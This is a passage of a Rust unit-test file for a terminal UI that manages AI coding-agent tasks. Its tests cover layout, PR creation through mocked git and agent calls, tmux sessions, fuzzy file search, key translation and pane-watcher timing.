//! Unit tests for app.rs logic

use super::*;

#[cfg(feature = "test-mocks")]
use crate::agent::MockAgentOperations;
#[cfg(feature = "test-mocks")]
use crate::git::{MockGitOperations, MockGitProviderOperations};
#[cfg(feature = "test-mocks")]
use crate::tmux::MockTmuxOperations;
use crossterm::event::KeyModifiers;

#[test]
fn visible_columns_use_all_columns_on_wide_terminals() {
    assert_eq!(visible_column_range(0, 160), 0..5);
    assert_eq!(visible_column_range(4, 140), 0..5);
}

#[test]
fn visible_columns_follow_selection_on_standard_terminals() {
    assert_eq!(visible_column_range(0, 120), 0..3);
    assert_eq!(visible_column_range(2, 120), 1..4);
    assert_eq!(visible_column_range(4, 120), 2..5);
}

#[test]
fn visible_columns_keep_two_usable_columns_on_narrow_terminals() {
    assert_eq!(visible_column_range(0, 80), 0..2);
    assert_eq!(visible_column_range(2, 80), 1..3);
    assert_eq!(visible_column_range(4, 80), 3..5);
}

#[test]
fn card_height_tracks_width_with_practical_bounds() {
    assert_eq!(card_height_for_width(8), 6);
    assert_eq!(card_height_for_width(20), 10);
    assert_eq!(card_height_for_width(28), 12);
    assert_eq!(card_height_for_width(40), 12);
    assert_eq!(card_height_for_width(100), 12);
}

#[test]
fn board_scrollbar_has_visible_thumb_and_reaches_track_ends() {
    assert_eq!(board_scrollbar_metrics(10, 3, 0, 12), Some((0, 3)));
    assert_eq!(board_scrollbar_metrics(10, 3, 7, 12), Some((9, 3)));
    assert_eq!(board_scrollbar_metrics(20, 1, 0, 8), Some((0, 2)));
}

#[test]
fn board_scrollbar_is_hidden_without_overflow_or_height() {
    assert_eq!(board_scrollbar_metrics(3, 3, 0, 12), None);
    assert_eq!(board_scrollbar_metrics(10, 3, 0, 0), None);
}

#[test]
fn styled_footer_emphasizes_shortcuts_without_changing_text() {
    let styles = TuiStyles::from_theme(&ThemeConfig::default());
    let line = styled_footer(" [o] new  [Enter] open ", styles);
    let rendered: String = line
        .spans
        .iter()
        .map(|span| span.content.as_ref())
        .collect();
    assert_eq!(rendered, "[o] new  [Enter] open");
    assert_eq!(line.spans[0].style.fg, Some(styles.selected));
    assert_eq!(line.spans[1].style.fg, Some(styles.dimmed));
}

#[test]
fn footer_groups_related_shortcuts() {
    let text = build_footer_text(None, false, 1, false, false);
    assert!(text.contains("[d] diff  ·  [m] run"), "{text}");
    assert!(text.contains("·  [?] help  [q] quit"), "{text}");
}

/// The footer is a summary now, not the list. It had reached 155 characters and
/// was being truncated on a 150-column terminal, which hid whichever bindings
/// happened to be last.
#[test]
fn every_footer_fits_a_narrow_terminal() {
    for cyclic in [false, true] {
        for fullscreen in [false, true] {
            for column in 0..=4 {
                let text = build_footer_text(None, false, column, cyclic, fullscreen);
                assert!(
                    text.chars().count() <= 120,
                    "column {column} is {} chars: {text}",
                    text.chars().count()
                );
            }
        }
    }
}

/// Whatever else it drops, it always says how to find the rest.
#[test]
fn every_footer_points_at_the_help_overlay() {
    for cyclic in [false, true] {
        for column in 0..=4 {
            let text = build_footer_text(None, false, column, cyclic, false);
            assert!(text.contains("[?] help"), "column {column}: {text}");
        }
    }
    assert!(build_footer_text(None, true, 0, false, false).contains("[?] help"));
}

/// Test that generate_pr_description correctly combines git diff and agent-generated text
#[test]
#[cfg(feature = "test-mocks")]
fn test_generate_pr_description_with_diff_and_agent() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    // Setup: git returns a diff stat
    mock_git
        .expect_diff_stat_from_main()
        .withf(|path: &Path| path == Path::new("/tmp/worktree"))
        .times(1)
        .returning(|_| " src/main.rs | 10 +++++++---\n 1 file changed".to_string());

    // Setup: agent generates a description
    mock_agent
        .expect_generate_text()
        .withf(|path: &Path, prompt: &str| {
            path == Path::new("/tmp/worktree") && prompt.contains("Add login feature")
        })
        .times(1)
        .returning(|_, _| {
            Ok("This PR implements user authentication with session management.".to_string())
        });

    // Execute
    let (title, body) = generate_pr_description(
        "Add login feature",
        Some("/tmp/worktree"),
        None,
        &mock_git,
        &mock_agent,
    );

    // Verify
    assert_eq!(title, "Add login feature");
    assert!(body.contains("This PR implements user authentication"));
    assert!(body.contains("## Changes"));
    assert!(body.contains("src/main.rs"));
}

/// Test that generate_pr_description handles missing worktree gracefully
#[test]
#[cfg(feature = "test-mocks")]
fn test_generate_pr_description_without_worktree() {
    let mock_git = MockGitOperations::new();
    let mock_agent = MockAgentOperations::new();

    // No expectations set - functions should not be called when worktree is None

    let (title, body) = generate_pr_description(
        "Simple task",
        None, // No worktree
        None,
        &mock_git,
        &mock_agent,
    );

    assert_eq!(title, "Simple task");
    assert!(body.is_empty());
}

/// Test that generate_pr_description handles empty diff gracefully
#[test]
#[cfg(feature = "test-mocks")]
fn test_generate_pr_description_with_empty_diff() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    // Git returns empty diff (no changes from main)
    mock_git
        .expect_diff_stat_from_main()
        .returning(|_| String::new());

    // Agent still generates description
    mock_agent
        .expect_generate_text()
        .returning(|_, _| Ok("Minor documentation update.".to_string()));

    let (title, body) = generate_pr_description(
        "Update docs",
        Some("/tmp/worktree"),
        None,
        &mock_git,
        &mock_agent,
    );

    assert_eq!(title, "Update docs");
    assert!(body.contains("Minor documentation update"));
    assert!(!body.contains("## Changes")); // No changes section when diff is empty
}

/// Test that generate_pr_description handles agent failure gracefully
#[test]
#[cfg(feature = "test-mocks")]
fn test_generate_pr_description_agent_failure() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    mock_git
        .expect_diff_stat_from_main()
        .returning(|_| " file.rs | 5 +++++\n".to_string());

    // Agent fails to generate
    mock_agent
        .expect_generate_text()
        .returning(|_, _| Err(anyhow::anyhow!("Agent not available")));

    let (title, body) = generate_pr_description(
        "Fix bug",
        Some("/tmp/worktree"),
        None,
        &mock_git,
        &mock_agent,
    );

    assert_eq!(title, "Fix bug");
    // Body should still have the diff, just no agent-generated text
    assert!(body.contains("## Changes"));
    assert!(body.contains("file.rs"));
}

// =============================================================================
// Tests for ensure_project_tmux_session
// =============================================================================

/// Test that ensure_project_tmux_session creates session when it doesn't exist
#[test]
#[cfg(feature = "test-mocks")]
fn test_ensure_project_tmux_session_creates_when_missing() {
    let mut mock_tmux = MockTmuxOperations::new();

    // Session doesn't exist
    mock_tmux
        .expect_has_session()
        .with(mockall::predicate::eq("my-project"))
        .times(1)
        .returning(|_| false);

    // Should create the session
    mock_tmux
        .expect_create_session()
        .with(
            mockall::predicate::eq("my-project"),
            mockall::predicate::eq("/home/user/project"),
        )
        .times(1)
        .returning(|_, _| Ok(()));

    ensure_project_tmux_session("my-project", Path::new("/home/user/project"), &mock_tmux);
}

/// Test that ensure_project_tmux_session skips creation when session exists
#[test]
#[cfg(feature = "test-mocks")]
fn test_ensure_project_tmux_session_skips_when_exists() {
    let mut mock_tmux = MockTmuxOperations::new();

    // Session already exists
    mock_tmux
        .expect_has_session()
        .with(mockall::predicate::eq("existing-project"))
        .times(1)
        .returning(|_| true);

    // create_session should NOT be called
    // (mockall will fail if unexpected calls are made)

    ensure_project_tmux_session("existing-project", Path::new("/tmp/project"), &mock_tmux);
}

// =============================================================================
// Tests for create_pr_with_content
// =============================================================================

/// Test successful PR creation with changes
#[test]
#[cfg(feature = "test-mocks")]
fn test_create_pr_with_content_success() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_git_provider = MockGitProviderOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    let task = Task {
        id: "test-123".to_string(),
        title: "Test task".to_string(),
        description: None,
        status: TaskStatus::Running,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: Some("test-session".to_string()),
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/test".to_string()),
        pr_number: None,
        pr_url: None,
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    // Expect: add all files
    mock_git
        .expect_add_all()
        .withf(|path: &Path| path == Path::new("/tmp/worktree"))
        .times(1)
        .returning(|_| Ok(()));

    // Expect: check for changes
    mock_git
        .expect_has_changes()
        .withf(|path: &Path| path == Path::new("/tmp/worktree"))
        .times(1)
        .returning(|_| true);

    // Expect: commit with co-author
    mock_git
        .expect_commit()
        .withf(|path: &Path, msg: &str| {
            path == Path::new("/tmp/worktree")
                && msg.contains("Test PR")
                && msg.contains("Co-Authored-By")
        })
        .times(1)
        .returning(|_, _| Ok(()));

    // Expect: push with upstream
    mock_git
        .expect_push()
        .withf(|path: &Path, branch: &str, set_upstream: &bool| {
            path == Path::new("/tmp/worktree") && branch == "feature/test" && *set_upstream
        })
        .times(1)
        .returning(|_, _, _| Ok(()));

    // Agent co-author string
    mock_agent
        .expect_co_author_string()
        .return_const("Claude <claude@anthropic.com>".to_string());

    // Expect: create PR
    mock_git_provider
        .expect_create_pr()
        .withf(
            |path: &Path, title: &str, body: &str, branch: &str, base: &Option<String>| {
                path == Path::new("/project")
                    && title == "Test PR"
                    && body == "Test body"
                    && branch == "feature/test"
                    && base.is_none()
            },
        )
        .times(1)
        .returning(|_, _, _, _, _| Ok((42, "https://github.com/org/repo/pull/42".to_string())));

    let result = create_pr_with_content(
        &task,
        Path::new("/project"),
        "Test PR",
        "Test body",
        &mock_git,
        &mock_git_provider,
        &mock_agent,
    );

    assert!(result.is_ok());
    let (pr_number, pr_url) = result.unwrap();
    assert_eq!(pr_number, 42);
    assert_eq!(pr_url, "https://github.com/org/repo/pull/42");
}

/// Test PR creation with no changes to commit
#[test]
#[cfg(feature = "test-mocks")]
fn test_create_pr_with_content_no_changes() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_git_provider = MockGitProviderOperations::new();
    let mock_agent = MockAgentOperations::new();

    let task = Task {
        id: "test-123".to_string(),
        title: "Test task".to_string(),
        description: None,
        status: TaskStatus::Running,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: Some("test-session".to_string()),
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/test".to_string()),
        pr_number: None,
        pr_url: None,
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    mock_git.expect_add_all().returning(|_| Ok(()));

    // No changes to commit
    mock_git.expect_has_changes().returning(|_| false);

    // commit should NOT be called (no expectation set)

    mock_git.expect_push().returning(|_, _, _| Ok(()));

    mock_git_provider
        .expect_create_pr()
        .returning(|_, _, _, _, _| Ok((1, "https://github.com/pr/1".to_string())));

    let result = create_pr_with_content(
        &task,
        Path::new("/project"),
        "PR Title",
        "PR Body",
        &mock_git,
        &mock_git_provider,
        &mock_agent,
    );

    assert!(result.is_ok());
}

/// Test PR creation failure on push
#[test]
#[cfg(feature = "test-mocks")]
fn test_create_pr_with_content_push_failure() {
    let mut mock_git = MockGitOperations::new();
    let mock_git_provider = MockGitProviderOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    let task = Task {
        id: "test-123".to_string(),
        title: "Test task".to_string(),
        description: None,
        status: TaskStatus::Running,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: None,
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/test".to_string()),
        pr_number: None,
        pr_url: None,
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| true);
    mock_git.expect_commit().returning(|_, _| Ok(()));
    mock_agent
        .expect_co_author_string()
        .return_const("Claude <claude@anthropic.com>".to_string());

    // Push fails
    mock_git
        .expect_push()
        .returning(|_, _, _| Err(anyhow::anyhow!("Permission denied")));

    let result = create_pr_with_content(
        &task,
        Path::new("/project"),
        "PR",
        "Body",
        &mock_git,
        &mock_git_provider,
        &mock_agent,
    );

    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Permission denied"));
}

// =============================================================================
// Tests for push_changes_to_existing_pr
// =============================================================================

/// Test pushing changes to existing PR
#[test]
#[cfg(feature = "test-mocks")]
fn test_push_changes_to_existing_pr_success() {
    let mut mock_git = MockGitOperations::new();
    let mut mock_agent = MockAgentOperations::new();
    mock_agent
        .expect_prompt_injection()
        .returning(|| crate::agent::PromptInjection::Unknown);

    let task = Task {
        id: "test-456".to_string(),
        title: "Existing PR task".to_string(),
        description: None,
        status: TaskStatus::Review,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: Some("test-session".to_string()),
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/existing".to_string()),
        pr_number: Some(99),
        pr_url: Some("https://github.com/org/repo/pull/99".to_string()),
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| true);

    // Commit message should include "Address review comments"
    mock_git
        .expect_commit()
        .withf(|_: &Path, msg: &str| msg.contains("Address review comments"))
        .returning(|_, _| Ok(()));

    // Push without setting upstream (false)
    mock_git
        .expect_push()
        .withf(|_: &Path, branch: &str, set_upstream: &bool| {
            branch == "feature/existing" && !*set_upstream
        })
        .returning(|_, _, _| Ok(()));

    mock_agent
        .expect_co_author_string()
        .return_const("Claude <claude@anthropic.com>".to_string());

    let result = push_changes_to_existing_pr(&task, &mock_git, &mock_agent);

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "https://github.com/org/repo/pull/99");
}

/// Test pushing when no changes exist
#[test]
#[cfg(feature = "test-mocks")]
fn test_push_changes_to_existing_pr_no_changes() {
    let mut mock_git = MockGitOperations::new();
    let mock_agent = MockAgentOperations::new();

    let task = Task {
        id: "test-789".to_string(),
        title: "Task with no changes".to_string(),
        description: None,
        status: TaskStatus::Review,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: None,
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/no-changes".to_string()),
        pr_number: Some(50),
        pr_url: Some("https://github.com/org/repo/pull/50".to_string()),
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| false);
    // No commit expected
    mock_git.expect_push().returning(|_, _, _| Ok(()));

    let result = push_changes_to_existing_pr(&task, &mock_git, &mock_agent);

    assert!(result.is_ok());
}

/// Test push with no existing PR URL
#[test]
#[cfg(feature = "test-mocks")]
fn test_push_changes_to_existing_pr_no_url() {
    let mut mock_git = MockGitOperations::new();
    let mock_agent = MockAgentOperations::new();

    let task = Task {
        id: "test-abc".to_string(),
        title: "Task without PR URL".to_string(),
        description: None,
        status: TaskStatus::Review,
        agent: "claude".to_string(),
        project_id: "proj-1".to_string(),
        session_name: None,
        worktree_path: Some("/tmp/worktree".to_string()),
        branch_name: Some("feature/branch".to_string()),
        pr_number: None,
        pr_url: None, // No PR URL
        plugin: None,
        cycle: 1,
        referenced_tasks: None,
        escalation_note: None,
        base_branch: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    mock_git.expect_add_all().returning(|_| Ok(()));
    mock_git.expect_has_changes().returning(|_| false);
    mock_git.expect_push().returning(|_, _, _| Ok(()));

    let result = push_changes_to_existing_pr(&task, &mock_git, &mock_agent);

    assert!(result.is_ok());
    assert_eq!(result.unwrap(), "Changes pushed to existing PR");
}

// =============================================================================
// Tests for fuzzy_find_files
// =============================================================================

/// Test fuzzy file search with matching pattern
#[test]
#[cfg(feature = "test-mocks")]
fn test_fuzzy_find_files_basic() {
    let mut mock_git = MockGitOperations::new();

    mock_git.expect_list_files().returning(|_| {
        vec![
            "src/main.rs".to_string(),
            "src/lib.rs".to_string(),
            "src/tui/app.rs".to_string(),
            "src/tui/board.rs".to_string(),
            "Cargo.toml".to_string(),
        ]
    });

    let results = fuzzy_find_files(Path::new("/project"), "app", 10, &mock_git);

    assert!(!results.is_empty());
    assert!(results.contains(&"src/tui/app.rs".to_string()));
}

/// Test fuzzy file search with empty pattern returns first N files
#[test]
#[cfg(feature = "test-mocks")]
fn test_fuzzy_find_files_empty_pattern() {
    let mut mock_git = MockGitOperations::new();

    mock_git.expect_list_files().returning(|_| {
        vec![
            "a.rs".to_string(),
            "b.rs".to_string(),
            "c.rs".to_string(),
            "d.rs".to_string(),
            "e.rs".to_string(),
        ]
    });

    let results = fuzzy_find_files(Path::new("/project"), "", 3, &mock_git);

    assert_eq!(results.len(), 3);
    assert_eq!(results[0], "a.rs");
    assert_eq!(results[1], "b.rs");
    assert_eq!(results[2], "c.rs");
}

/// Test fuzzy file search with no matches
#[test]
#[cfg(feature = "test-mocks")]
fn test_fuzzy_find_files_no_matches() {
    let mut mock_git = MockGitOperations::new();

    mock_git
        .expect_list_files()
        .returning(|_| vec!["main.rs".to_string(), "lib.rs".to_string()]);

    let results = fuzzy_find_files(Path::new("/project"), "xyz123", 10, &mock_git);

    assert!(results.is_empty());
}

/// Test fuzzy file search with empty file list
#[test]
#[cfg(feature = "test-mocks")]
fn test_fuzzy_find_files_empty_list() {
    let mut mock_git = MockGitOperations::new();

    mock_git.expect_list_files().returning(|_| vec![]);

    let results = fuzzy_find_files(Path::new("/project"), "app", 10, &mock_git);

    assert!(results.is_empty());
}

/// Test fuzzy file search respects max_results
#[test]
#[cfg(feature = "test-mocks")]
fn test_fuzzy_find_files_max_results() {
    let mut mock_git = MockGitOperations::new();

    mock_git.expect_list_files().returning(|_| {
        vec![
            "src/app1.rs".to_string(),
            "src/app2.rs".to_string(),
            "src/app3.rs".to_string(),
            "src/app4.rs".to_string(),
            "src/app5.rs".to_string(),
        ]
    });

    let results = fuzzy_find_files(Path::new("/project"), "app", 2, &mock_git);

    assert_eq!(results.len(), 2);
}

// =============================================================================
// Tests for fuzzy_score
// =============================================================================

/// Test fuzzy score with exact match
#[test]
fn test_fuzzy_score_exact_match() {
    let score = fuzzy_score("main.rs", "main.rs");
    assert!(score > 0);
}

/// Test fuzzy score with partial match
#[test]
fn test_fuzzy_score_partial_match() {
    let score = fuzzy_score("src/main.rs", "main");
    assert!(score > 0);
}

/// Test fuzzy score with no match
#[test]
fn test_fuzzy_score_no_match() {
    let score = fuzzy_score("main.rs", "xyz");
    assert_eq!(score, 0);
}

/// Test fuzzy score with empty needle
#[test]
fn test_fuzzy_score_empty_needle() {
    let score = fuzzy_score("main.rs", "");
    assert_eq!(score, 1);
}

/// Test fuzzy score bonus for word start
#[test]
fn test_fuzzy_score_word_boundary_bonus() {
    // "app" at start of segment should score higher than in middle
    let score_start = fuzzy_score("src/app.rs", "app");
    let score_middle = fuzzy_score("src/myapp.rs", "app");
    assert!(score_start > score_middle);
}

/// Test fuzzy score bonus for consecutive matches
#[test]
fn test_fuzzy_score_consecutive_bonus() {
    // Consecutive "main" should score higher than scattered chars within a word
    let score_consecutive = fuzzy_score("main.rs", "main");
    let score_scattered = fuzzy_score("myaweirdin.rs", "main");
    assert!(score_consecutive > score_scattered);
}

// =============================================================================
// Tests for popup key translation
//
// Translation is a pure function and delivery is `tmux::input`'s job, so the key
// names — the part agents actually depend on — are pinned here without a mock in
// sight.
// =============================================================================

#[cfg(test)]
fn translated(code: KeyCode, modifiers: KeyModifiers) -> Option<PaneInput> {
    popup_key_input("win", crossterm::event::KeyEvent::new(code, modifiers))
}

#[cfg(test)]
fn translated_key(code: KeyCode, modifiers: KeyModifiers) -> String {
    match translated(code, modifiers) {
        Some(PaneInput::Key { key, .. }) => key,
        other => panic!("expected a key name, got {other:?}"),
    }
}

#[test]
fn a_character_becomes_literal_text_for_the_right_target() {
    assert_eq!(
        translated(KeyCode::Char('a'), KeyModifiers::NONE),
        Some(PaneInput::Text {
            target: "win".to_string(),
            text: "a".to_string(),
        })
    );
}

#[test]
fn enter_and_escape_keep_their_tmux_names() {
    assert_eq!(translated_key(KeyCode::Enter, KeyModifiers::NONE), "Enter");
    assert_eq!(translated_key(KeyCode::Esc, KeyModifiers::NONE), "Escape");
    assert_eq!(
        translated_key(KeyCode::Backspace, KeyModifiers::NONE),
        "BSpace"
    );
    assert_eq!(translated_key(KeyCode::Delete, KeyModifiers::NONE), "DC");
    assert_eq!(translated_key(KeyCode::Insert, KeyModifiers::NONE), "IC");
    assert_eq!(translated_key(KeyCode::F(5), KeyModifiers::NONE), "F5");
}

#[test]
fn alt_arrows_stay_word_boundary_navigation() {
    // Option+Left/Right in a composer. Both spellings matter: macOS terminals
    // send the arrow form, and Emacs-style bindings send M-b / M-f.
    assert_eq!(translated_key(KeyCode::Left, KeyModifiers::ALT), "M-Left");
    assert_eq!(translated_key(KeyCode::Right, KeyModifiers::ALT), "M-Right");
    assert_eq!(translated_key(KeyCode::Char('b'), KeyModifiers::ALT), "M-b");
    assert_eq!(translated_key(KeyCode::Char('f'), KeyModifiers::ALT), "M-f");
}

#[test]
fn control_modifiers_reach_the_pane() {
    // Interrupting or suspending a program from the in-app popup depends on
    // these arriving as keys rather than as the letters they are typed with.
    assert_eq!(
        translated_key(KeyCode::Char('c'), KeyModifiers::CONTROL),
        "C-c"
    );
    assert_eq!(
        translated_key(
            KeyCode::Char('x'),
            KeyModifiers::CONTROL | KeyModifiers::ALT
        ),
        "C-M-x"
    );
}

#[test]
fn an_unreadable_window_listing_never_marks_a_task_exited() {
    use std::collections::HashSet;
    let live: HashSet<String> = ["pj:t1".to_string()].into_iter().collect();

    assert!(!window_is_gone(Some("pj:t1"), Some(&live)));
    assert!(window_is_gone(Some("pj:gone"), Some(&live)));

    // The direction that matters. One listing answers for every task, so a
    // failed listing read as "no windows" would mark the whole board `Exited`:
    // a visible, wrong status change. Unknown has to stay unknown.
    assert!(
        !window_is_gone(Some("pj:t1"), None),
        "an unreadable listing must mean unknown, not gone"
    );
    // An empty-but-readable listing is real information: the windows are gone.
    assert!(window_is_gone(Some("pj:t1"), Some(&HashSet::new())));
    // A task with no session was never running in the first place.
    assert!(!window_is_gone(None, Some(&HashSet::new())));
}

#[test]
fn the_pane_watcher_only_wakes_the_loop_when_the_pane_changed() {
    // The property the whole event-driven loop rests on: an agent painting
    // nothing produces no wake-ups, so no frame is drawn and no capture is
    // re-parsed. Asserted on the comparison itself, which is what the watcher
    // thread decides with.
    let a = (
        "task-x".to_string(),
        b"same".to_vec(),
        Some(crate::tmux::PaneMetrics {
            cursor_x: 1,
            cursor_y: 2,
            pane_height: 30,
            history_size: 0,
        }),
    );
    assert!(!pane_capture_changed(&Some(a.clone()), &a.0, &a.1, &a.2));

    // Content, geometry and target each count as a change on their own: a
    // cursor that moved without the text changing is still a redraw, and a
    // capture for a different pane is never this pane's content.
    let mut moved = a.clone();
    moved.2.as_mut().unwrap().cursor_x = 9;
    assert!(pane_capture_changed(
        &Some(a.clone()),
        &moved.0,
        &moved.1,
        &moved.2
    ));
    assert!(pane_capture_changed(&Some(a.clone()), &a.0, b"other", &a.2));
    assert!(pane_capture_changed(&Some(a.clone()), "task-y", &a.1, &a.2));
    // Nothing seen yet always sends, so a popup that seeded its own content
    // still gets a first real capture.
    assert!(pane_capture_changed(&None, &a.0, &a.1, &a.2));
}

#[test]
fn the_watcher_backs_off_only_after_the_pane_has_settled() {
    // Fast while the pane is moving — that is the cadence a keystroke's echo
    // rides on — and slow once it has not moved for a while, because then
    // nobody is waiting on a millisecond.
    assert_eq!(pane_watch_interval(0), SHELL_REFRESH_INTERVAL);
    assert_eq!(
        pane_watch_interval(PANE_IDLE_ROUNDS - 1),
        SHELL_REFRESH_INTERVAL
    );
    assert_eq!(pane_watch_interval(PANE_IDLE_ROUNDS), PANE_IDLE_INTERVAL);
    assert!(PANE_IDLE_INTERVAL > SHELL_REFRESH_INTERVAL);
    // The back-off must not be reachable between two keystrokes at any human
    // typing speed, or the first character after a pause would lag.
    assert!(SHELL_REFRESH_INTERVAL * PANE_IDLE_ROUNDS >= std::time::Duration::from_millis(150));
}

#[test]
fn a_poke_puts_the_watcher_back_on_the_fast_cadence() {
    // The regression this exists for: a poke's own capture runs before the key
    // it announced has reached the pane, so it sees nothing new. If that left
    // the count alone, the echo would wait out another idle interval — which is
    // the back-off charging exactly what it was built not to.
    let settled = PANE_IDLE_ROUNDS + 10;
    assert_eq!(pane_watch_interval(settled), PANE_IDLE_INTERVAL);
    assert_eq!(
        pane_watch_interval(pane_watch_rounds_after_wait(settled, true)),
        SHELL_REFRESH_INTERVAL,
        "a keystroke must return the watcher to the fast cadence"
    );
    // A wait that simply expired changes nothing: an idle pane stays idle.
    assert_eq!(pane_watch_rounds_after_wait(settled, false), settled);
}

#[test]
fn a_paint_signal_only_wakes_the_pane_being_watched() {
    // The output watch mirrors *every* pane in the session, so filtering is what
    // keeps another task's output from driving captures of this one.
    let watch = PaneWatch::default();
    watch.follow(Some("pj:mine"), SHELL_POPUP_TAIL_LINES);
    watch.set_pane_id(Some("%7".to_string()));
    let before = watch.signal_count();

    watch.mark_output("%9");
    assert_eq!(watch.signal_count(), before, "another pane must not signal");
    watch.mark_output("%7");
    assert_ne!(watch.signal_count(), before, "the watched pane must signal");

    // With no id resolved, push is not active and nothing may signal — the
    // watcher is on the timer, and a stray wake would defeat its back-off.
    watch.set_pane_id(None);
    let idle = watch.signal_count();
    watch.mark_output("%7");
    assert_eq!(watch.signal_count(), idle);
}

#[test]
fn following_a_new_pane_drops_the_previous_pane_id() {
    // Otherwise the old pane's output would keep signalling after the popup
    // moved, and the new pane's would not.
    let watch = PaneWatch::default();
    watch.follow(Some("pj:one"), SHELL_POPUP_TAIL_LINES);
    watch.set_pane_id(Some("%1".to_string()));
    watch.follow(Some("pj:two"), SHELL_POPUP_TAIL_LINES);
    let before = watch.signal_count();
    watch.mark_output("%1");
    assert_eq!(
        watch.signal_count(),
        before,
        "the old pane must stop signalling the moment the popup moves"
    );
}

#[test]
fn the_interval_becomes_a_rate_limit_under_push() {
    use std::time::Duration;
    let typing = Some(Duration::ZERO);
    // Push removes the floor: with a signal driving captures, the interval's
    // only job is to stop a pane painting flat out from driving one capture per
    // notification.
    assert_eq!(
        push_rate_limit_wait(true, Duration::ZERO, typing),
        Some(SHELL_REFRESH_INTERVAL)
    );
    assert_eq!(
        push_rate_limit_wait(true, SHELL_REFRESH_INTERVAL, typing),
        None
    );
    // Polling paces itself through its own wait, so it must never sleep twice.
    assert_eq!(push_rate_limit_wait(false, Duration::ZERO, typing), None);
}

#[test]
fn output_is_sampled_slower_than_a_keystroke_echo() {
    use std::time::Duration;
    // The two reasons to capture deserve different answers. One shared ceiling
    // makes a pane painting flat out cost more than polling would: a capture
    // makes the tmux server format the whole pane, so capturing every frame is
    // expensive where nobody is watching for one.
    assert!(PANE_OUTPUT_MIN_INTERVAL > SHELL_REFRESH_INTERVAL);

    // Nobody is waiting on one frame of an agent's output.
    let idle_hands = Some(PANE_TYPING_WINDOW * 2);
    assert_eq!(
        push_rate_limit_wait(true, Duration::ZERO, idle_hands),
        Some(PANE_OUTPUT_MIN_INTERVAL)
    );
    assert_eq!(
        push_rate_limit_wait(true, Duration::ZERO, None),
        Some(PANE_OUTPUT_MIN_INTERVAL)
    );

    // But a keystroke's echo arrives as a *paint*, indistinguishable from the
    // agent's own output — so for a window after typing, paints stay fast or
    // every character would echo up to `PANE_OUTPUT_MIN_INTERVAL` late.
    assert_eq!(
        push_rate_limit_wait(true, Duration::ZERO, Some(PANE_TYPING_WINDOW / 2)),
        Some(SHELL_REFRESH_INTERVAL)
    );
    assert!(PANE_TYPING_WINDOW > SHELL_REFRESH_INTERVAL * 4);
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_failing_output_watch_is_not_retried_every_iteration() {
    // The failure path runs inside a loop that ticks every
    // `SHELL_REFRESH_INTERVAL`, and each attempt is two `tmux` processes. A
    // popup left open on a window that has since closed would otherwise spawn a
    // hundred processes a second — the very cost this change removes.
    let mut mock = MockTmuxOperations::new();
    // The point of the assertion: asked once, not once per call.
    mock.expect_pane_id().times(1).returning(|_| None);
    let watch = Arc::new(PaneWatch::default());
    let mut retry_at: Option<std::time::Instant> = None;

    for _ in 0..50 {
        let push = attach_pane_push(None, "pj:t1", &watch, &mock, &mut retry_at);
        assert!(push.is_none(), "a pane with no id cannot be watched");
    }
    assert!(retry_at.is_some(), "a failed attach must schedule a retry");
}

#[test]
fn the_output_watch_is_reused_only_within_one_session() {
    // `%output` never crosses sessions, so the session decides whether an open
    // watch still covers the pane being followed.
    assert_eq!(pane_push_session("pj:task-one"), "pj");
    assert_eq!(
        pane_push_session("pj:task-one"),
        pane_push_session("pj:task-two")
    );
    assert_ne!(pane_push_session("pj:t"), pane_push_session("other:t"));
    // A bare target names no session; treating it as one is better than
    // panicking, and `pane_target` guarantees it does not happen.
    assert_eq!(pane_push_session("bare"), "bare");
}

#[test]
fn the_transition_queue_paces_itself() {
    // A SQLite query, so it does not belong on the housekeeping tick — ten times
    // a second, forever, whether or not anything is connected. A transition is a
